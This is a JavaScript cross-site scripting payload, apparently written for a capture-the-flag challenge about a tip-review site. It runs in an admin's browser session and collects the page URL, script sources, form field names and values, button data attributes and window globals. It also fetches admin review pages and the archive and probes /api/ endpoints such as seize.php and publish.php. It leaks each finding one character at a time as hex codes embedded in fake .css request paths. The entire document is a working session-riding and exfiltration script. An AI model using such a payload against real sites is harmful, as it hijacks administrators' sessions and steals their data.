(function(){
  var UNIQ="v9x";

  function sig(tag){
    fetch("/account.php/"+UNIQ+"_"+tag+".css",{credentials:"include"}).catch(function(){});
  }
  function exfilStr(prefix,str,maxLen){
    var n=Math.min((str||"").length,maxLen||60);
    for(var i=0;i<n;i++){
      var code=str.charCodeAt(i).toString(16).padStart(2,"0");
      var iHex=i.toString(16).padStart(2,"0");
      fetch("/account.php/"+UNIQ+"_"+prefix+"_"+iHex+"_"+code+".css",{credentials:"include"}).catch(function(){});
    }
    sig(prefix+"_l"+n.toString(16).padStart(2,"0"));
  }

  sig("init");

  // === PHASE 1: Inspect current page DOM (XSS runs ON the review page) ===
  var curUrl = window.location.href;
  var curPath = window.location.pathname + window.location.search;
  exfilStr("url", curPath, 80);

  // ALL script tags on current page (incl chart helper)
  var scripts = document.querySelectorAll("script[src]");
  var scriptInfo = "";
  scripts.forEach(function(s){ scriptInfo += "|S:" + s.getAttribute("src"); });
  if(scriptInfo) exfilStr("scr", scriptInfo, 300);
  else sig("no_scr");

  // ALL forms on current page
  var forms = document.querySelectorAll("form");
  var formInfo = "";
  forms.forEach(function(f){
    formInfo += "|F:" + (f.getAttribute("action")||"?") + "[" + (f.getAttribute("method")||"GET") + "]";
    f.querySelectorAll("input,button,select,textarea").forEach(function(el){
      formInfo += "(" + el.getAttribute("name") + ":" + el.getAttribute("value") + ")";
    });
  });
  if(formInfo) exfilStr("frm", formInfo, 300);
  else sig("no_frm");

  // ALL buttons and links with data-* attributes on current page
  var btns = document.querySelectorAll("button,[data-action],[data-url],[data-endpoint],a.btn,input[type=submit]");
  var btnInfo = "";
  btns.forEach(function(b){
    var d = "";
    Array.from(b.attributes).forEach(function(a){ if(a.name.startsWith("data-")) d += a.name+"="+a.value+";"; });
    btnInfo += "|B:" + b.tagName + ":" + (b.getAttribute("href")||b.textContent.trim().slice(0,20)) + ":" + d;
  });
  if(btnInfo) exfilStr("btn", btnInfo, 300);
  else sig("no_btn");

  // Check window object for chart globals (after short delay for chart helper to load)
  setTimeout(function(){
    var chartKeys = Object.keys(window).filter(function(k){
      return /chart|graph|vantage|review|api/i.test(k);
    });
    if(chartKeys.length > 0) exfilStr("wnd", chartKeys.join(","), 200);
    else sig("no_wnd");
  }, 2000);

  // === PHASE 2: Also fetch review.php?id=N with real admin session ===
  // Get tip ID from current URL
  var m = window.location.search.match(/id=(\d+)/);
  var tipId = m ? m[1] : "0";
  exfilStr("tid", tipId, 5);

  // Fetch the page for our SEIZE tip (id=16 has seized.html content)
  fetch("/admin/review.php?id=16", {credentials:"include"}).then(function(r){return r.text();}).then(function(html){
    sig("got_r16");
    var doc = new DOMParser().parseFromString(html, "text/html");
    var scripts2 = doc.querySelectorAll("script[src]");
    var info = "";
    scripts2.forEach(function(s){ info += "|S:" + s.getAttribute("src"); });
    var forms2 = doc.querySelectorAll("form");
    forms2.forEach(function(f){
      info += "|F:" + (f.getAttribute("action")||"?") + "[" + (f.getAttribute("method")||"GET") + "]";
      f.querySelectorAll("input,button").forEach(function(el){
        info += "(" + el.getAttribute("name") + ":" + el.getAttribute("value") + ")";
      });
    });
    var btns2 = doc.querySelectorAll("button,[data-action],input[type=submit]");
    btns2.forEach(function(b){
      info += "|B:" + b.tagName + ":" + b.textContent.trim().slice(0,30);
    });
    if(info) exfilStr("r16", info, 300);
    else sig("no_r16");
  }).catch(function(){ sig("err_r16"); });

  // === PHASE 3: Fetch /archive/ and look for comments in the DOM ===
  fetch("/archive/", {credentials:"include"}).then(function(r){return r.text();}).then(function(html){
    sig("got_arc");
    // Also look for any hidden form or special endpoint
    var doc2 = new DOMParser().parseFromString(html, "text/html");
    var forms3 = doc2.querySelectorAll("form");
    sig("arc_f" + forms3.length);
  }).catch(function(){ sig("err_arc"); });

  // === PHASE 4: Check /api/ endpoints ===
  var apiEndpoints = [
    "/api/schedule.php",
    "/api/seize.php",
    "/api/publish.php",
    "/api/release.php",
    "/api/file.php",
    "/api/content.php",
    "/api/homepage.php"
  ];
  apiEndpoints.forEach(function(ep){
    fetch(ep, {credentials:"include"}).then(function(r){
      var status = r.status;
      var tag = ep.replace(/[^a-z0-9]/gi,"_").slice(-10);
      sig("api_" + status + "_" + tag);
    }).catch(function(){ });
  });

})();
